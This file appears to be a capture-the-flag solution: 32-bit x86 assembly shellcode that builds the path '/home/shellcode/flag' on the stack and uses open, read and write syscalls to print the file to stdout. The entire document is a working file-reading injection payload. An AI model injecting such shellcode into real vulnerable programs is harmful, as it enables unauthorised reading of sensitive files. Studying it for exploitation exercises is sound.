BITS 32

global _start

_start:                     ; this is where code starts getting exec'ed
    xor eax,eax
    xor edx,edx
    push eax
    
    ;/home/shellcode/flag
    push 0x67616c66     ;galf
    push 0x2f65646f     ;/edo
    push 0x636c6c65     ;clle 
    push 0x68732f65     ;hs/e
    push 0x6d6f682f     ;moh/

    mov ebx, esp      ; mov string's address to ebx 
    mov al,0x5        ; open(
    xor ecx, ecx      ;   read-only mode
    int 0x80          ; );

    mov ebx,eax       ;  file_descriptor,
    mov al,0x3        ;  read(
    sub esp,0x50      ;   allocate a space for buffer  
    mov ecx, esp      ;   mov buffer address to ecx 
    mov dl,0x50       ;   *bufsize
    int 0x80          ; );

    ; write to STDOUT
    xor ebx, ebx      ; clear ebx
    mov al,0x4        ; write(
    mov bl,0x1        ;   STDOUT,
    int 0x80          ; );

    ; exit
    mov al,  1       ; exit(
    xor ebx, ebx     ;   0
    int 0x80         ; );
